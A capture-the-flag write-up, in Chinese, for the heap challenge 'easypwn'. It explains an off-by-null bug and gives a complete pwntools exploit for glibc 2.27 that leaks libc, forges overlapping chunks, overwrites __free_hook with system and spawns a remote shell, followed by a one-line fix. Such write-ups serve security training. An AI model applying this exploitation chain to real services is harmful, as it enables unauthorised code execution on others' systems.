# easypwn



## 简单描述

只有4个功能, 添加,删除,查看,退出.保护全开,采用new和delete的方式进行内存管理



## 知识点

2.27 off by null 利用



## vul

在add函数中添加了花指令，导致F5伪代码错误。

通过以上发现存在个off by one漏洞，但是需要满足`plist[index][0]` == '\x00'，也就是输入内容第一个字符满足'\x00'，这样才能触发off by null漏洞

那么后面就是glibc 2.27的off by null漏洞利用了。利用思路是修改`__free_hook`为system，执行free的时候传入"/bin/sh"即可拿到shell



## exp


```python
#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from pwn import *
from sys import *
context.terminal = ['tmux', 'splitw', '-h']
#context(arch = 'amd64', os = 'linux', log_level='debug')
exeFile  = "./pwn"
libFile  = "./libc.so.6"
LOCAL = 0
LIBC = 1

if(LOCAL == 0):
    if(len(argv) < 3):
        print('Usage: python2 ./exp.py [host] [port]')
        exit(-1)
    host = argv[1]
    port = int(argv[2])

def add(size, text):
    io.sendlineafter('>>', str(1))
    io.sendlineafter('???', str(size))
    io.sendafter(':>', text)

def delete(idx):
    io.sendlineafter('>>', str(2))
    io.sendlineafter('???', str(idx))

def show(idx):
    io.sendlineafter('>>', str(3))    
    io.sendlineafter('???', str(idx))

def quit():
    io.sendlineafter('>>', str(4))    

#--------------------------Exploit--------------------------
def exploit():
    for i in range(12):
        add(0xf8,  'A\n')

    for i in range(9):
        delete(i)

    for i in range(9):
        add(0xf8,  'AAAAAAA\n')

    show(7)


    leak = u64(io.recvuntil('\x7f')[-6:] + b'\x00\x00')
    libc_base = leak - libc.sym['__malloc_hook'] - 0x10 - 592
    print('leak: ' + hex(leak))
    print('libc_base: ' + hex(libc_base))

    for i in range(8):
        delete(i)

    add(0xf8,  '\n') # idx 0
    delete(9)
    add(0xf8,  '\x00' + 'A' * 0xef + p64(0x100 * 3)) # idx 1 -> old 9 
    delete(8)
    delete(10) # unlink

    add(0x80, '\n') # idx 2
    add(0xe0, 'A' * 0x68 + p64(0x101) + p64(libc_base + libc.sym['__free_hook']) + p64(0) + '\n') # idx 3

    add(0xf0, '/bin/sh\x00' + p64(0) + '\n') # idx 4

    add(0xf0, p64(libc_base + libc.sym['system']) + '\n') # idx 4
    #gdb.attach(io)
    delete(4) # get shell
    sleep(0.1)
    io.sendline('cat flag')

if __name__ == '__main__':
    if LOCAL:
        exe = ELF(exeFile)
        if LIBC:
            libc = ELF(libFile)
            #io = exe.process()
            io = exe.process(env = {"LD_PRELOAD" : libFile})
        else:
            io = exe.process()
    else:
        exe = ELF(exeFile)
        io = remote(host, port)
        if LIBC:
            libc = ELF(libFile)
    
    exploit()
    io.interactive()
```



### 漏洞修复

将off by null赋值指令代码给nop掉就行了。
